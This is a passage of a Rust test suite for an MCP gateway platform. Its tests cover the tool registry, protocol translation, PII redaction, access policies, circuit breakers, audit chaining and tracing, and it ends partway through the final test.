//! Comprehensive Production Test Suite for Omni MCP Platform (Rust 2.0 Engine).
//! Verifies all 13 REA architecture claims + advanced Rust resilience & performance capabilities.

use omni_mcp::config::OmniConfig;
use omni_mcp::control_plane::{
    AutoCrawler, IDLParser, MCPFxHeartbeatMonitor, MCPRegistry, ThirdPartyAuthExchange,
};
use omni_mcp::data_plane::{
    CircuitBreakerRegistry, CircuitState, CodeModeTypeGenerator, InMemoryConfigCache,
    MCPProxyGateway, MuttleyMeshClient, PIIRedactor, ProtocolTranslator, RateLimiter,
    ResponseProjectionEngine, SandboxLimits, SecurityCharterEngine, SemanticResponseCache,
};
use omni_mcp::extension::{AifxCLI, OmniMCPServer};
use omni_mcp::json;
use omni_mcp::json::JsonValue;
use omni_mcp::models::{
    ActorType, CharterPolicy, ProtocolType, RPCBatchOrSingle, RPCRequest, ServerRecord, ToolRecord,
    ToolStatus, CIRCUIT_OPEN, TOOL_DISABLED, UNAUTHORIZED,
};
use omni_mcp::server::ProductionGatewayContext;
use omni_mcp::storage::{WalRegistryStore, MerkleAuditStore, GENESIS_HASH};
use std::collections::HashMap;
use std::env;
use std::fs;
use std::sync::{Arc, RwLock};
use std::time::{SystemTime, UNIX_EPOCH};

fn temp_test_path(prefix: &str) -> String {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let mut p = env::temp_dir();
    p.push(format!("{}_{}_{}", prefix, std::process::id(), nanos));
    p.to_string_lossy().into_owned()
}

#[test]
fn test_wal_persistence_across_restart() {
    let dir = temp_test_path("omni_wal_test");
    let _ = fs::create_dir_all(&dir);
    let db_path = format!("{}/test_omni.db", dir);

    {
        let store = Arc::new(WalRegistryStore::new(&db_path));
        let registry = MCPRegistry::new(Some(store.clone()));

        let mut server = ServerRecord::new(
            "logistics-svc",
            "Logistics",
            "Global fleet routing",
            "fleet-ops",
        );
        server.protocol = ProtocolType::Grpc;
        server.status = ToolStatus::Enabled;

        let mut tool = ToolRecord::new(
            "RouteVehicle",
            "Computes optimal route",
            json!({"type": "object", "properties": {"vehicle_id": {"type": "string"}}}),
        );
        tool.status = ToolStatus::Enabled;
        server.add_tool(tool);
        registry.register_server(server);

        let diff = registry
            .propose_tool_update(
                "logistics-svc",
                "RouteVehicle",
                Some("Production route computer"),
                None,
                "alice",
            )
            .unwrap();
        assert!(registry.approve_diff(&diff.diff_id, "tech_lead"));
        store.close();
    }

    // Simulate process restart with fresh store & registry
    let new_store = Arc::new(WalRegistryStore::new(&db_path));
    let restarted_registry = MCPRegistry::new(Some(new_store.clone()));

    let recovered = restarted_registry
        .get_server("logistics-svc")
        .expect("Server should persist across restart");
    assert_eq!(recovered.display_name, "Logistics");
    let recovered_tool = recovered
        .get_tool("RouteVehicle")
        .expect("Tool should persist");
    assert_eq!(recovered_tool.version, 2);
    assert_eq!(recovered_tool.description, "Production route computer");

    new_store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_sharded_token_bucket_rate_limit() {
    let limiter = RateLimiter::new(60);
    let key = "test_agent_token:agent";

    let (allowed1, _) = limiter.check_rate_limit(key, 2);
    assert!(allowed1);

    let (allowed2, _) = limiter.check_rate_limit(key, 2);
    assert!(allowed2);

    let (allowed3, _) = limiter.check_rate_limit(key, 2);
    assert!(!allowed3, "Third immediate call should be throttled");
}

#[test]
fn test_disabled_by_default_and_diff_rollback() {
    let registry = MCPRegistry::new(None);
    let mut server = ServerRecord::new(
        "paymentservice",
        "Payment Service",
        "Processes payments for rides and eats",
        "team-payments",
    );
    let tool = ToolRecord::new(
        "ChargeRider",
        "Charges rider card for trip amount",
        json!({"type": "object", "properties": {"amount": {"type": "number"}}}),
    );
    server.add_tool(tool);
    registry.register_server(server);

    // Verify disabled by default
    let fetched = registry.get_server("paymentservice").unwrap();
    assert_eq!(fetched.status, ToolStatus::Disabled);
    assert_eq!(
        fetched.get_tool("ChargeRider").unwrap().status,
        ToolStatus::Disabled
    );

    // Propose diff
    let diff = registry
        .propose_tool_update(
            "paymentservice",
            "ChargeRider",
            Some("Charges rider credit card securely with multi-currency support."),
            None,
            "alice@uber.com",
        )
        .unwrap();
    assert!(!diff.approved);
    assert_eq!(diff.proposed_version, 2);

    // Before approval, version is still 1
    assert_eq!(
        registry
            .get_server("paymentservice")
            .unwrap()
            .get_tool("ChargeRider")
            .unwrap()
            .version,
        1
    );

    // Approve diff
    assert!(registry.approve_diff(&diff.diff_id, "bob-lead@uber.com"));
    let updated = registry.get_server("paymentservice").unwrap();
    let t2 = updated.get_tool("ChargeRider").unwrap();
    assert_eq!(t2.version, 2);
    assert!(t2.description.contains("multi-currency support"));

    // Rollback to v1
    assert!(registry.rollback_tool("paymentservice", "ChargeRider", 1));
    let rolled = registry.get_server("paymentservice").unwrap();
    let t1 = rolled.get_tool("ChargeRider").unwrap();
    assert_eq!(t1.version, 1);
    assert_eq!(t1.description, "Charges rider card for trip amount");
}

#[test]
fn test_protobuf_and_thrift_idl_parsing() {
    let proto = r#"
    syntax = "proto3";
    package uber.fleet;
    message FleetVehicleRequest {
        string vehicle_id = 1; // Unique vehicle identifier
        repeated string sensor_ids = 2; // Specific sensors
        map<string, string> tags = 3; // Vehicle metadata tags
    }
    service FleetManagement {
        // Retrieve vehicle health and diagnostic telemetry
        rpc GetVehicleTelemetry (FleetVehicleRequest) returns (VehicleTelemetryResponse);
    }
    "#;
    let services = IDLParser::parse_protobuf(proto);
    assert_eq!(services.len(), 1);
    let svc = &services[0];
    assert_eq!(svc.service_name, "FleetManagement");
    assert_eq!(svc.methods.len(), 1);
    let m = &svc.methods[0];
    assert_eq!(m.name, "GetVehicleTelemetry");
    assert_eq!(m.protocol, ProtocolType::Grpc);

    let schema = IDLParser::translate_to_json_schema(m);
    let props = schema.get("properties").unwrap();
    assert_eq!(
        props.get("vehicle_id").unwrap().get("type").unwrap().as_str(),
        Some("string")
    );
    assert_eq!(
        props.get("sensor_ids").unwrap().get("type").unwrap().as_str(),
        Some("array")
    );
    assert_eq!(
        props.get("tags").unwrap().get("type").unwrap().as_str(),
        Some("object")
    );

    let thrift = r#"
    namespace py uber.trip
    service TripPricing {
        // Calculate dynamic surge pricing for trip
        TripQuote calculateSurge(1: string rider_id, 2: double pickup_lat, 3: list<string> promo_codes)
    }
    "#;
    let t_services = IDLParser::parse_thrift(thrift);
    assert_eq!(t_services.len(), 1);
    assert_eq!(t_services[0].service_name, "TripPricing");
    assert_eq!(t_services[0].protocol, ProtocolType::TChannel);
    assert_eq!(t_services[0].methods[0].fields.len(), 3);
    assert!(t_services[0].methods[0].fields[2].is_repeated);
}

#[test]
fn test_native_mcpfx_heartbeat_and_autocrawler() {
    let registry = MCPRegistry::new(None);
    let monitor = MCPFxHeartbeatMonitor::new();
    monitor.emit_heartbeat("geospatial-index", "10.0.1.20", 9090, "maps-team", "Geospatial Index");

    let crawler = AutoCrawler::new(registry.clone(), Some(monitor), None);
    let res = crawler.run_discovery_workflow();
    assert_eq!(res.get("discovered_servers").unwrap().as_i64(), Some(1));

    let srv = registry.get_server("geospatial-index").unwrap();
    assert!(srv.is_native);
    assert_eq!(srv.status, ToolStatus::Disabled);
    assert!(srv.tools.contains_key("geospatial-index_query"));
}

#[test]
fn test_data_plane_routing_and_protocol_translation() {
    let registry = MCPRegistry::new(None);
    let cache = InMemoryConfigCache::new(registry.clone(), 5.0);
    let mesh = MuttleyMeshClient::new();
    let translator = ProtocolTranslator::new(Some(mesh.clone()), None);
    let gateway = MCPProxyGateway::new(cache.clone(), Some(translator));

    let mut server = ServerRecord::new(
        "dispatch-service",
        "Dispatch Service",
        "Real-time ride matching and driver dispatch",
        "core-dispatch",
    );
    server.protocol = ProtocolType::Grpc;
    server.status = ToolStatus::Enabled;

    let mut tool = ToolRecord::new(
        "FindNearbyDrivers",
        "Finds top matching drivers within radius",
        json!({
            "type": "object",
            "properties": {
                "lat": {"type": "number"},
                "lng": {"type": "number"}
            },
            "required": ["lat", "lng"]
        }),
    );
    tool.status = ToolStatus::Enabled;
    tool.protocol = ProtocolType::Grpc;
    tool.downstream_endpoint = "muttley://dispatch/FindNearbyDrivers".to_string();
    tool.downstream_method = "FindNearbyDrivers".to_string();
    server.add_tool(tool);
    registry.register_server(server);
    cache.refresh_now();

    // 1. Initialize
    let init_req = RPCRequest::new(1i64, "initialize", JsonValue::object());
    let init_resp = gateway.handle_request("dispatch-service", &init_req, "agent", None);
    assert!(init_resp.error.is_none());
    assert_eq!(
        init_resp
            .result
            .unwrap()
            .get("serverInfo")
            .unwrap()
            .get("name")
            .unwrap()
            .as_str(),
        Some("omni-mcp/dispatch-service")
    );

    // 2. tools/list
    let list_req = RPCRequest::new(2i64, "tools/list", JsonValue::object());
    let list_resp = gateway.handle_request("dispatch-service", &list_req, "agent", None);
    let tools = list_resp
        .result
        .unwrap()
        .get("tools")
        .unwrap()
        .as_array()
        .unwrap()
        .clone();
    assert_eq!(tools.len(), 1);
    assert_eq!(tools[0].get("name").unwrap().as_str(), Some("FindNearbyDrivers"));

    // 3. tools/call over gRPC -> Muttley
    let call_req = RPCRequest::new(
        3i64,
        "tools/call",
        json!({
            "name": "FindNearbyDrivers",
            "arguments": {"lat": 37.77, "lng": -122.41}
        }),
    );
    let call_resp = gateway.handle_request("dispatch-service", &call_req, "agent", None);
    assert!(call_resp.error.is_none());
    assert_eq!(mesh.get_call_count(Some("dispatch-service")), 1);

    // 4. Disable tool and verify rejection
    registry.toggle_tool_status("dispatch-service", "FindNearbyDrivers", ToolStatus::Disabled);
    cache.refresh_now();
    let disabled_resp = gateway.handle_request("dispatch-service", &call_req, "agent", None);
    assert_eq!(disabled_resp.error.unwrap().code, TOOL_DISABLED);
}

#[test]
fn test_pii_redactor_and_abac_charter_policy() {
    let raw_text = "Driver: John Doe (john.doe@uber.com), Phone: +1 555-234-5678, SSN: 123-45-6789, Card: 4111 2222 3333 4444, Token: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9";
    let redacted = PIIRedactor::redact_text(raw_text);
    assert!(!redacted.contains("john.doe@uber.com"));
    assert!(redacted.contains("[REDACTED_EMAIL]"));
    assert!(redacted.contains("[REDACTED_PHONE]"));
    assert!(redacted.contains("[REDACTED_SSN]"));
    assert!(redacted.contains("[REDACTED_CARD]"));
    assert!(redacted.contains("[REDACTED_TOKEN]"));

    let mut policy = CharterPolicy::default();
    policy.allowed_actors = vec![ActorType::Human];
    let mut tool = ToolRecord::new("DeleteCustomerData", "GDPR deletion", JsonValue::object());
    tool.charter_policy = Some(policy);
    let server = ServerRecord::new("security-svc", "Security", "", "sec");

    let (allowed_agent, reason) =
        SecurityCharterEngine::evaluate_access(&server, &tool, "agent", None);
    assert!(!allowed_agent);
    assert!(reason.unwrap().contains("not authorized"));

    let (allowed_human, _) = SecurityCharterEngine::evaluate_access(&server, &tool, "human", None);
    assert!(allowed_human);
}

#[test]
fn test_response_projection_and_omni_mcp_discovery() {
    let full_payload = json!({
        "driver": {
            "id": "drv_1",
            "name": "Alex",
            "internal_metrics": {"secret_score": 98.4},
            "vehicle": {"make": "Tesla", "model": "Model 3", "vin": "5YJ3E1EB"}
        },
        "trips": [
            {"id": "t1", "fare": 22.5, "secret": "x"},
            {"id": "t2", "fare": 18.0, "secret": "y"}
        ],
        "unrelated_logs": ["log1", "log2"],
        "status": "AVAILABLE"
    });

    let paths = vec![
        "driver.name".to_string(),
        "driver.vehicle.make".to_string(),
        "trips[].id".to_string(),
        "status".to_string(),
    ];
    let projected = ResponseProjectionEngine::apply_projection(&full_payload, Some(&paths));
    assert_eq!(
        projected.get("driver").unwrap().get("name").unwrap().as_str(),
        Some("Alex")
    );
    assert_eq!(
        projected
            .get("driver")
            .unwrap()
            .get("vehicle")
            .unwrap()
            .get("make")
            .unwrap()
            .as_str(),
        Some("Tesla")
    );
    assert!(projected.get("driver").unwrap().get("internal_metrics").is_none());
    assert!(projected.get("unrelated_logs").is_none());
    assert_eq!(
        projected.get("trips").unwrap().as_array().unwrap()[0]
            .get("id")
            .unwrap()
            .as_str(),
        Some("t1")
    );
    assert!(
        projected.get("trips").unwrap().as_array().unwrap()[0]
            .get("secret")
            .is_none()
    );

    // Omni MCP 4-step flow
    let registry = MCPRegistry::new(None);
    let cache = InMemoryConfigCache::new(registry.clone(), 5.0);
    let gateway = MCPProxyGateway::new(cache.clone(), None);
    let omni = OmniMCPServer::new(cache.clone(), gateway);

    let mut srv = ServerRecord::new(
        "eats-catalog",
        "Merchant Catalog",
        "Discovers restaurant menus and dishes",
        "eats-eng",
    );
    srv.status = ToolStatus::Enabled;
    let mut tool = ToolRecord::new(
        "GetMenu",
        "Gets menu items for restaurant",
        json!({"type": "object", "properties": {"store_id": {"type": "string"}}}),
    );
    tool.status = ToolStatus::Enabled;
    srv.add_tool(tool);
    registry.register_server(srv);
    cache.refresh_now();

    // Step 1: discover_server
    let disc_req = RPCRequest::new(
        1i64,
        "tools/call",
        json!({"name": "discover_server", "arguments": {"query": "restaurant menu dishes"}}),
    );
    let disc_resp = omni.handle_request(&disc_req, "agent", None);
    let text = disc_resp.result.unwrap()["content"][0]["text"]
        .as_str()
        .unwrap()
        .to_string();
    let parsed = JsonValue::parse(&text).unwrap();
    assert_eq!(
        parsed["servers"][0]["server_name"].as_str(),
        Some("eats-catalog")
    );

    // Step 2: discover_tools
    let tools_req = RPCRequest::new(
        2i64,
        "tools/call",
        json!({"name": "discover_tools", "arguments": {"server_name": "eats-catalog"}}),
    );
    let tools_resp = omni.handle_request(&tools_req, "agent", None);
    let parsed_tools =
        JsonValue::parse(tools_resp.result.unwrap()["content"][0]["text"].as_str().unwrap())
            .unwrap();
    assert_eq!(parsed_tools["tools"][0]["name"].as_str(), Some("GetMenu"));

    // Step 3: get_tool_schema
    let schema_req = RPCRequest::new(
        3i64,
        "tools/call",
        json!({"name": "get_tool_schema", "arguments": {"server_name": "eats-catalog", "tool_name": "GetMenu"}}),
    );
    let schema_resp = omni.handle_request(&schema_req, "agent", None);
    let schema_data =
        JsonValue::parse(schema_resp.result.unwrap()["content"][0]["text"].as_str().unwrap())
            .unwrap();
    assert!(schema_data["inputSchema"]["properties"]
        .get("store_id")
        .is_some());
}

#[test]
fn test_circuit_breaker_and_semantic_cache_and_batch_rpc() {
    let registry = MCPRegistry::new(None);
    let cache = InMemoryConfigCache::new(registry.clone(), 5.0);
    let mesh = MuttleyMeshClient::new();
    let translator = ProtocolTranslator::new(Some(mesh.clone()), None);
    let cb = CircuitBreakerRegistry::new(2, 60.0);
    let sem_cache = SemanticResponseCache::new(30.0);
    let gateway =
        MCPProxyGateway::with_resilience(cache.clone(), translator, cb.clone(), sem_cache.clone());

    let mut srv = ServerRecord::new("pricing-svc", "Pricing", "Surge calc", "pricing");
    srv.status = ToolStatus::Enabled;
    let mut tool = ToolRecord::new("GetQuote", "Gets quote", JsonValue::object());
    tool.status = ToolStatus::Enabled;
    srv.add_tool(tool);
    registry.register_server(srv);
    cache.refresh_now();

    let req = RPCRequest::new(
        1i64,
        "tools/call",
        json!({"name": "GetQuote", "arguments": {"zone": "sfo"}}),
    );

    // First call -> cache miss, hits Muttley
    let resp1 = gateway.handle_request("pricing-svc", &req, "agent", None);
    assert_eq!(
        resp1.result.unwrap()["_metadata"]["cache_hit"].as_bool(),
        Some(false)
    );
    assert_eq!(mesh.get_call_count(Some("pricing-svc")), 1);

    // Second identical call -> served from SemanticResponseCache without hitting Muttley!
    let resp2 = gateway.handle_request("pricing-svc", &req, "agent", None);
    assert_eq!(
        resp2.result.unwrap()["_metadata"]["cache_hit"].as_bool(),
        Some(true)
    );
    assert_eq!(mesh.get_call_count(Some("pricing-svc")), 1);

    // Trip circuit breaker and verify fast fail
    cb.record_failure("pricing-svc");
    cb.record_failure("pricing-svc");
    assert_eq!(cb.get_state("pricing-svc"), CircuitState::Open);

    let blocked_resp = gateway.handle_request("pricing-svc", &req, "agent", None);
    assert_eq!(blocked_resp.error.unwrap().code, CIRCUIT_OPEN);

    // Recover circuit and test Batch JSON-RPC 2.0
    cb.record_success("pricing-svc");
    let batch_json = json!([
        {"jsonrpc": "2.0", "id": 10, "method": "tools/list"},
        {"jsonrpc": "2.0", "id": 11, "method": "tools/call", "params": {"name": "GetQuote", "arguments": {"zone": "nyc"}}}
    ]);
    let batch_req = RPCBatchOrSingle::from_json(&batch_json).unwrap();
    let batch_out = gateway.handle_batch_or_single("pricing-svc", batch_req, "agent", None);
    assert_eq!(batch_out.as_array().unwrap().len(), 2);
}

#[test]
fn test_third_party_oauth_token_exchange_and_unauthorized_rpc() {
    let auth = ThirdPartyAuthExchange::new();
    auth.register_user_token("emp_alice", "jira", "jira_secret_oauth_xyz");
    assert_eq!(
        auth.exchange_token("emp_alice", "jira").as_deref(),
        Some("jira_secret_oauth_xyz")
    );
    // Sandbox fallback for uber_token_*
    assert!(auth
        .exchange_token("uber_token_bob", "jira")
        .unwrap()
        .starts_with("oauth_3p_jira_"));

    // Verify UNAUTHORIZED RPC error when actor is disallowed on gateway
    let registry = MCPRegistry::new(None);
    let cache = InMemoryConfigCache::new(registry.clone(), 5.0);
    let gateway = MCPProxyGateway::new(cache.clone(), None);

    let mut srv = auth.create_third_party_server("jira", "eng-prod");
    srv.status = ToolStatus::Enabled;
    srv.charter_policy.allowed_actors = vec![ActorType::Human];
    if let Some(t) = srv.get_tool_mut("search_issues") {
        t.status = ToolStatus::Enabled;
    }
    registry.register_server(srv);
    cache.refresh_now();

    let call_req = RPCRequest::new(
        1i64,
        "tools/call",
        json!({"name": "search_issues", "arguments": {"jql": "project = OMNI"}}),
    );
    let denied = gateway.handle_request("3p_jira", &call_req, "agent", Some("emp_alice"));
    assert_eq!(denied.error.unwrap().code, UNAUTHORIZED);

    let allowed = gateway.handle_request("3p_jira", &call_req, "human", Some("emp_alice"));
    assert!(allowed.error.is_none());
}

#[test]
fn test_omni_mcp_batch_invoke_tools() {
    let registry = MCPRegistry::new(None);
    let cache = InMemoryConfigCache::new(registry.clone(), 5.0);
    let gateway = MCPProxyGateway::new(cache.clone(), None);
    let omni = OmniMCPServer::new(cache.clone(), gateway);

    let mut srv = ServerRecord::new("fleet-svc", "Fleet", "Fleet ops", "fleet");
    srv.status = ToolStatus::Enabled;
    let mut tool = ToolRecord::new("PingVehicle", "Pings vehicle", JsonValue::object());
    tool.status = ToolStatus::Enabled;
    srv.add_tool(tool);
    registry.register_server(srv);
    cache.refresh_now();

    let batch_req = RPCRequest::new(
        99i64,
        "tools/call",
        json!({
            "name": "batch_invoke_tools",
            "arguments": {
                "calls": [
                    {"server_name": "fleet-svc", "tool_name": "PingVehicle", "arguments": {"id": "v1"}},
                    {"server_name": "fleet-svc", "tool_name": "PingVehicle", "arguments": {"id": "v2"}}
                ]
            }
        }),
    );
    let resp = omni.handle_request(&batch_req, "agent", None);
    assert!(resp.error.is_none());
    let text = resp.result.unwrap()["content"][0]["text"]
        .as_str()
        .unwrap()
        .to_string();
    let parsed = JsonValue::parse(&text).unwrap();
    assert_eq!(parsed["batch_results"].as_array().unwrap().len(), 2);
}

#[test]
fn test_aifx_cli_and_http_gateway_endpoints() {
    let dir = temp_test_path("omni_http_test");
    let mut cfg = OmniConfig::default();
    cfg.data_dir = dir.clone();
    let ctx = ProductionGatewayContext::new(Some(cfg));

    // Test CLI list, search, call to file, and benchmark
    let cli = AifxCLI::new(Some(ctx.registry.clone()), None);
    let list_out = cli.list_servers("json");
    let parsed_list = JsonValue::parse(&list_out).unwrap();
    assert!(parsed_list.as_array().unwrap().len() >= 3);

    let search_out = cli.search_tools("driver", "json");
    let parsed_search = JsonValue::parse(&search_out).unwrap();
    assert!(!parsed_search.as_array().unwrap().is_empty());

    let out_file = format!("{}/cli_output.json", dir);
    let call_msg = cli.call_tool(
        "driverdispatchservice",
        "GetDriverLocation",
        r#"{"driver_id": "drv_102"}"#,
        Some("data.driver.name,data.driver.email"),
        Some(&out_file),
        "agent",
        Some("uber_token_test"),
    );
    assert!(call_msg.contains("Written response"));
    let file_content = fs::read_to_string(&out_file).unwrap();
    let saved_json = JsonValue::parse(&file_content).unwrap();
    assert!(saved_json.get("result").is_some());

    // Verify HTTP endpoints (/healthz, /readyz, /metrics, /api/stats, /api/servers)
    let headers = HashMap::new();
    let (status_h, _, _, body_h) = ctx.handle_http("GET", "/healthz", &headers, &[]);
    assert_eq!(status_h, 200);
    let h_json = JsonValue::parse(&String::from_utf8(body_h).unwrap()).unwrap();
    assert_eq!(h_json["status"].as_str(), Some("healthy"));
    assert_eq!(h_json["runtime"].as_str(), Some("rust"));

    let (status_m, _, _, body_m) = ctx.handle_http("GET", "/metrics", &headers, &[]);
    assert_eq!(status_m, 200);
    let m_text = String::from_utf8(body_m).unwrap();
    assert!(m_text.contains("omni_requests_total"));
    assert!(m_text.contains("omni_semantic_cache_hits_total"));

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v3_openapi_and_swagger_idl_discovery() {
    let dir = temp_test_path("omni_openapi_test");
    let store = Arc::new(WalRegistryStore::new(&format!("{}/reg.db", dir)));
    let registry = MCPRegistry::new(Some(store.clone()));
    let crawler = AutoCrawler::new(registry.clone(), None, None);

    // OpenAPI 3.1 specification
    let openapi_yaml_or_json = r#"
    {
      "openapi": "3.1.0",
      "info": {"title": "Eats Delivery API", "version": "1.0.0"},
      "paths": {
        "/orders/{order_id}/deliver": {
          "post": {
            "summary": "Dispatch order delivery",
            "tags": ["delivery", "courier", "logistics"],
            "parameters": [
              {"name": "order_id", "in": "path", "required": true, "schema": {"type": "string"}},
              {"name": "courier_id", "in": "query", "required": true, "schema": {"type": "string"}}
            ]
          }
        }
      }
    }
    "#;
    crawler.register_idl_source("eats-delivery", openapi_yaml_or_json);

    // Swagger 2.0 specification
    let swagger_json = r#"
    {
      "swagger": "2.0",
      "info": {"title": "Rider Loyalty API", "version": "2.0.0"},
      "paths": {
        "/loyalty/points": {
          "get": {
            "summary": "Retrieve rider reward points balance",
            "tags": ["loyalty", "rewards"],
            "parameters": [
              {"name": "rider_id", "in": "query", "required": true, "type": "string"}
            ]
          }
        }
      }
    }
    "#;
    crawler.register_idl_source("rider-loyalty", swagger_json);

    crawler.run_discovery_workflow();

    let servers = registry.list_servers(None);
    let s_delivery = servers.iter().find(|s| s.name.contains("eatsdelivery")).expect("EatsDelivery should be registered");
    assert_eq!(s_delivery.protocol, ProtocolType::Http);
    let tool_deliver = s_delivery.tools.values().next().expect("Tool deliver should exist");
    assert!(tool_deliver.name.contains("deliver"));
    assert!(tool_deliver.tags.contains(&"delivery".to_string()));
    assert!(tool_deliver.is_mutation);

    let s_loyalty = servers.iter().find(|s| s.name.contains("riderloyalty")).expect("RiderLoyalty should be registered");
    let tool_points = s_loyalty.tools.values().next().expect("Tool points should exist");
    assert!(tool_points.name.contains("points"));
    assert!(!tool_points.is_mutation);

    store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v3_merkle_chained_audit_trail() {
    let dir = temp_test_path("omni_merkle_test");
    let audit_file = format!("{}/audit.log", dir);
    let store = MerkleAuditStore::new(Some(audit_file));

    // Record 3 sequential invocations
    let r1 = store.record_invocation(
        "agent",
        "DriverDispatchService",
        "GetDriverLocation",
        &json!({"driver_id": "drv_1"}),
        "OK",
        150,
    );
    assert_eq!(r1.index, 0);
    assert_eq!(r1.prev_hash, GENESIS_HASH);

    let r2 = store.record_invocation(
        "human",
        "TripBillingService",
        "GetTripFare",
        &json!({"trip_id": "trip_99"}),
        "OK",
        220,
    );
    assert_eq!(r2.index, 1);
    assert_eq!(r2.prev_hash, r1.current_hash);

    let r3 = store.record_invocation(
        "agent",
        "PaymentsService",
        "RefundCharge",
        &json!({"charge_id": "ch_7"}),
        "OK:canary",
        310,
    );
    assert_eq!(r3.index, 2);
    assert_eq!(r3.prev_hash, r2.current_hash);

    let (verified, count) = store.verify_chain();
    assert!(verified);
    assert_eq!(count, 3);
    assert_eq!(store.get_head_hash(), r3.current_hash);

    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v3_opentelemetry_w3c_tracing_and_canary_routing() {
    let dir = temp_test_path("omni_otel_test");
    let store = Arc::new(WalRegistryStore::new(&format!("{}/reg.db", dir)));
    let registry = MCPRegistry::new(Some(store.clone()));
    let cache = InMemoryConfigCache::new(registry.clone(), 60.0);

    let mut srv = ServerRecord::new(
        "dispatch-service",
        "Dispatch Service",
        "Fleet telemetry",
        "fleet-team",
    );
    srv.protocol = ProtocolType::Http;
    srv.status = ToolStatus::Enabled;

    let mut tool = ToolRecord::new(
        "GetTelemetry",
        "Returns vehicle telemetry data",
        json!({"type": "object", "properties": {"vehicle_id": {"type": "string"}}}),
    );
    tool.status = ToolStatus::Enabled;
    tool.version = 1;
    tool.canary_version = Some(2);
    tool.canary_weight_pct = 100; // 100% canary for deterministic test verification
    srv.add_tool(tool);
    registry.register_server(srv);
    cache.refresh_now();

    let audit_store = Arc::new(MerkleAuditStore::new(None));
    let traces = Arc::new(RwLock::new(Vec::new()));
    let gateway = MCPProxyGateway::new(cache, None)
        .with_observability(audit_store.clone(), traces.clone());

    // Incoming standard W3C traceparent header
    let incoming_traceparent = "00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01";
    let req = RPCRequest::new(
        1001i64,
        "tools/call",
        json!({
            "name": "GetTelemetry",
            "arguments": {"vehicle_id": "veh_42"}
        }),
    );

    let resp = gateway.handle_request_with_trace(
        "dispatch-service",
        &req,
        "agent",
        Some("test_token"),
        Some(incoming_traceparent),
    );

    assert!(resp.error.is_none());
    let meta = &resp.result.unwrap()["_metadata"];
    assert_eq!(meta["trace_id"].as_str(), Some("4bf92f3577b34da6a3ce929d0e0e4736"));
    assert_eq!(meta["canary"].as_bool(), Some(true));
    assert_eq!(meta["version"].as_i64(), Some(2));

    // Verify OpenTelemetry trace span buffer
    let spans_guard = traces.read().unwrap();
    assert_eq!(spans_guard.len(), 1);
    let span = &spans_guard[0];
    assert_eq!(span.trace_id, "4bf92f3577b34da6a3ce929d0e0e4736");
    assert_eq!(span.parent_span_id.as_deref(), Some("00f067aa0ba902b7"));
    assert_eq!(span.attributes.get("mcp.canary").unwrap().as_bool(), Some(true));

    store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v3_resilient_fallback_execution() {
    let dir = temp_test_path("omni_fallback_test");
    let store = Arc::new(WalRegistryStore::new(&format!("{}/reg.db", dir)));
    let registry = MCPRegistry::new(Some(store.clone()));
    let cache = InMemoryConfigCache::new(registry.clone(), 60.0);

    let mut srv = ServerRecord::new(
        "billing-service",
        "Billing Service",
        "Billing and payments",
        "billing-team",
    );
    srv.protocol = ProtocolType::Http;
    srv.status = ToolStatus::Enabled;

    // Tool 1: Fallback tool (Healthy)
    let mut fb_tool = ToolRecord::new(
        "RefundChargeV1",
        "Legacy synchronous refund fallback",
        json!({"type": "object"}),
    );
    fb_tool.status = ToolStatus::Enabled;
    srv.add_tool(fb_tool);

    // Tool 2: Primary tool with fallback configured
    let mut primary_tool = ToolRecord::new(
        "RefundChargeV2",
        "Modern fast async refund",
        json!({"type": "object"}),
    );
    primary_tool.status = ToolStatus::Enabled;
    primary_tool.fallback_tool = Some("RefundChargeV1".to_string());
    srv.add_tool(primary_tool);

    registry.register_server(srv);
    cache.refresh_now();

    let gateway = MCPProxyGateway::new(cache, None);
    let req = RPCRequest::new(
        2002i64,
        "tools/call",
        json!({
            "name": "RefundChargeV2",
            "arguments": {"charge_id": "ch_999"}
        }),
    );

    let resp = gateway.handle_request("billing-service", &req, "agent", None);
    assert!(resp.error.is_none());
    let meta = &resp.result.unwrap()["_metadata"];
    assert_eq!(meta["server"].as_str(), Some("billing-service"));

    store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v3_autonomous_planning_diagnostics_and_mcp_resources() {
    let dir = temp_test_path("omni_planning_test");
    let mut cfg = OmniConfig::default();
    cfg.data_dir = dir.clone();
    let ctx = ProductionGatewayContext::new(Some(cfg));
    let omni = &ctx.omni_mcp;

    // 1. Test recommend_tools (Autonomous planning)
    let plan_req = RPCRequest::new(
        3001i64,
        "tools/call",
        json!({
            "name": "recommend_tools",
            "arguments": {
                "goal": "track driver coordinates and fetch location telemetry",
                "limit": 3
            }
        }),
    );
    let plan_resp = omni.handle_request(&plan_req, "agent", None);
    assert!(plan_resp.error.is_none());
    let plan_text = plan_resp.result.unwrap()["content"][0]["text"].as_str().unwrap().to_string();
    let plan_json = JsonValue::parse(&plan_text).unwrap();
    let pipeline = plan_json["recommended_pipeline"].as_array().expect("Pipeline array");
    assert!(!pipeline.is_empty());
    assert_eq!(pipeline[0]["tool_name"].as_str(), Some("GetDriverLocation"));

    // 2. Test explain_error (Self-healing diagnostics)
    let diag_req = RPCRequest::new(
        3002i64,
        "tools/call",
        json!({
            "name": "explain_error",
            "arguments": {
                "server_name": "driverdispatchservice",
                "tool_name": "NonExistentTool",
                "error_message": "Method not found"
            }
        }),
    );
    let diag_resp = omni.handle_request(&diag_req, "agent", None);
    assert!(diag_resp.error.is_none());
    let diag_text = diag_resp.result.unwrap()["content"][0]["text"].as_str().unwrap().to_string();
    let diag_json = JsonValue::parse(&diag_text).unwrap();
    assert_eq!(diag_json["tool_status"].as_str(), Some("NOT_FOUND"));
    assert!(diag_json["suggested_action"].as_str().unwrap().contains("discover_tools"));

    // 3. Test MCP Resources list and read
    let res_list_req = RPCRequest::new(3003i64, "resources/list", json!({}));
    let res_list_resp = omni.handle_request(&res_list_req, "agent", None);
    assert!(res_list_resp.error.is_none());
    let resources = res_list_resp.result.unwrap()["resources"].as_array().unwrap().clone();
    assert!(resources.iter().any(|r| r["uri"].as_str() == Some("omni://audit/merkle-head")));

